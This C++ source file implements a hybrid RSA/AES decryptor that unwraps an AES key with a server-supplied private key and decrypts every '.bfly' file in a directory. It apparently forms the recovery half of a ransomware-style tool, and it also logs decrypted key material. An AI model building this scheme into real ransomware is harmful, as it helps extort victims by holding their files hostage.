
#include <memory>

#include "crypto/decryptor.h"

namespace butterfly
{

namespace hybrid
{

Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _aesDecryptor(new aes::AESDecryptor())
{
    LOG_TRACE("Create class Decryptor");
}

Decryptor::~Decryptor()
{

}

void Decryptor::removeBFLYEnding(std::string &filepath)
{
    if (filepath.find(butterfly::ENC_BFLY_FILE_ENDING) != std::string::npos)
    {
        filepath.erase(filepath.length() - butterfly::ENC_BFLY_FILE_ENDING.length());
    }
}

void Decryptor::removeDecryptedFiles()
{

    butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
    butterfly::removeFile(butterfly::RSA_ENCKEY_CPKEY_FILENAME);
    butterfly::removeFile(butterfly::RSA_IV_CPKEY_FILENAME);

    butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
    butterfly::removeFile(butterfly::RSA_ENCKEY_AESKEY_FILENAME);
    butterfly::removeFile(butterfly::RSA_IV_AESKEY_FILENAME);

    butterfly::removeFile(butterfly::ENC_AESIV_FILENAME);
    butterfly::removeFile(butterfly::RSA_ENCKEY_AESIV_FILENAME);
    butterfly::removeFile(butterfly::RSA_IV_AESIV_FILENAME);

}

void Decryptor::invokeDir(const std::string &path)
{

    std::string aesk = decryptAESKeyPair("AESKey.bin", butterfly::ENC_AESKEY_FILENAME);
    std::string aesiv = decryptAESKeyPair("AESIV.bin", butterfly::ENC_AESIV_FILENAME);

    LOG_TRACE("Length of AESKEY in decrypt: " << aesk.length() << " and length of AESIV in decrypt: " << aesiv.length());

    if (aesk.empty() or aesiv.empty())
    {
        std::cout << "Decrypted AESKey or AESIV is empty!" << std::endl;
        LOG_ERROR("Decrypted AESKey or AESIV is empty!")
        return;
    }

    auto files = DirectoryIterator::getAllFiles(path);
    for (auto &file: files)
    {
        LOG_TRACE("FILE: " << file);
        std::string filepath = file.string();
        removeBFLYEnding(filepath);
        decryptFileWithAES(filepath, aesk, aesiv);
    }

    removeDecryptedFiles();
}

std::string Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile)
{

    _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(pkeyFromServer));

    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents(encCPrivateRSAFile);
    EVP_PKEY *CPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

    try
    {
        _rsaDecryptorCPrivateRSA->decryptEVP(CPrivateRSAPKey, encCPrivateRSA, butterfly::ENC_CPRIVATERSA_FILENAME);
        _decryptedCPrivateRSA = _rsaDecryptorCPrivateRSA->getDecryptedMessage();
        LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);

    } catch (RSADecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

    return _decryptedCPrivateRSA;
}

std::string Decryptor::decryptAESKeyPair(const std::string &aesKeyFile, const std::string &type)
{
    _rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));

    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(aesKeyFile); // Length of encAESKey = 256
    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();

    std::string decryptedAESKey;
    try
    {
        _rsaDecryptorAESKey->decryptEVP(aesKeyPKey, encAESKey, type);
        decryptedAESKey = _rsaDecryptorAESKey->getDecryptedMessage();
        LOG_TRACE("Decrypted Content from file " << aesKeyFile << ": " << decryptedAESKey);

    } catch (RSADecryptionException &e)
    {
        std::cout << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

    return decryptedAESKey;
}

void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &aeskey, const std::string &aesiv)
{
    // Set AESKey and AESIV
    _aesDecryptor->setAESKey(aeskey);
    _aesDecryptor->setAESIv(aesiv);

    try
    {
        // Decrypt the file with AES
        _aesDecryptor->decryptFile(filepath);

    } catch (AESDecryptionException &e)
    {
        std::cout << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

}

} // namespace hybrid

} // namespace butterfly
